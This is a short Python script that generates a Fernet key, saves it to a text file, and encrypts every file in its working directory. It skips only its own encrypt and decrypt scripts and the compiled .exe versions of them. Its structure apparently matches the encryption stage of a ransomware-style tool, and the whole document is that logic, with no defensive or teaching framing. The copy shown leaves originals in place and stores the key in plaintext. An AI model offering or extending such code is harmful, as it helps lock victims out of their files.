from cryptography.fernet import Fernet
import os

directory_path = '.'

def generate_key():
    return Fernet.generate_key()

def encrypt_file(filename, key):
    with open(filename, 'rb') as file:
        plaintext = file.read()

    cipher_suite = Fernet(key)
    encrypted_text = cipher_suite.encrypt(plaintext)

    with open(filename + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_text)

# Generate a key
key = generate_key()
save_key = open("encryption_key.txt", "w")
print("%s" % key.decode(), file=save_key)
save_key.close()

# Encrypt a file
for file_to_encrypt in os.listdir(directory_path):
    if os.path.isfile(os.path.join(directory_path, file_to_encrypt)):
        if file_to_encrypt not in ["decrypt.py", "decrypt.exe", "encrypt.py", "encrypt.exe", "encryption_key.txt"]:
            encrypt_file(file_to_encrypt, key)